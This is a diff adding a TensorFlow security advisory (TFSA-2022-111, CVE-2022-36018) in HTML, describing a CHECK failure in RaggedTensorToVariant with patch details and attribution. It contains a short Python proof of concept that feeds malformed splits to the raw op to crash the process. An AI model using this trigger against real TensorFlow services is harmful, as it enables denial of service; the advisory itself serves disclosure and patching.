@@ -1,0 +1,19 @@
+<h2>TFSA-2022-111: <code>CHECK</code> fail in <code>RaggedTensorToVariant</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-36018</p>
+<h3>Impact</h3>
+<p>If <code>RaggedTensorToVariant</code> is given a <code>rt_nested_splits</code> list that contains tensors of ranks other than one, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.
+```python
+import tensorflow as tf</p>
+<p>batched_input = True
+rt_nested_splits = tf.constant([0,32,64], shape=[3], dtype=tf.int64)
+rt_dense_values = tf.constant([0,32,64], shape=[3], dtype=tf.int64)
+tf.raw_ops.RaggedTensorToVariant(rt_nested_splits=rt_nested_splits, rt_dense_values=rt_dense_values, batched_input=batched_input)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/88f93dfe691563baa4ae1e80ccde2d5c7a143821">88f93dfe691563baa4ae1e80ccde2d5c7a143821</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.</p>
